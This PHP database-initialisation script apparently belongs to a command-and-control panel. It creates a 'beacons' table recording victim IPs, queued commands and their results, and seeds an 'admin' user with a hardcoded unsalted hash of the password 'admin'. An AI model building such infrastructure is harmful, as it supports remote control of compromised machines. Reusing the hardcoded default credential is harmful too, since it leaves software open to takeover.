<?php 

// Connect to the DB
include_once root . "/logic/native/dbconnect.php";

// Check if users table exist, if dont - create
$stmt = $conn->prepare("SELECT 1 FROM users");

try 
{
    $stmt->execute();
    // Close statement
    unset($stmt);
}

catch(PDOException $e)
{
  $users = 'CREATE TABLE `users` (
    `id` int(11) NOT NULL AUTO_INCREMENT,
    `username` varchar(20) DEFAULT NULL,
    `password` varchar(150) CHARACTER SET utf8 DEFAULT NULL,
    `role` int(11) DEFAULT NULL,
    PRIMARY KEY (`id`)
  );';

  $conn->exec($users);

}

// Check if beacons table exist, if dont - create
$stmt = $conn->prepare("SELECT 1 FROM beacons");

try 
{
    $stmt->execute();
    // Close statement
    unset($stmt);
}

catch(PDOException $e)
{
  $beacons = 'CREATE TABLE `beacons` (
    `id` int(11) NOT NULL AUTO_INCREMENT,
    `beacon_id` varchar(32) DEFAULT NULL,
    `victim_ip` varchar(18) CHARACTER SET utf8 DEFAULT NULL,
    `last_active` datetime DEFAULT NULL,
    `command` BLOB DEFAULT NULL,
    `result` BLOB DEFAULT NULL,
    PRIMARY KEY (`id`)
  );';

  $conn->exec($beacons);

}

// Check if users exist
$a = $conn->prepare("SELECT * FROM users WHERE username=:admin");

$admin="admin";

$a->bindParam(':admin', $admin);

$a->execute();

// If user does not exist, create it
if($a->rowCount()!=1)
{
    $users = "INSERT INTO `users` VALUES (1,'admin','8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918',1);";
    $conn->exec($users);
    header("Location: /");
}

else
{
    header("Location: /");
}
    
// Close statement
unset($a);

// Close the DB
include_once root . "/logic/native/dbclose.php";



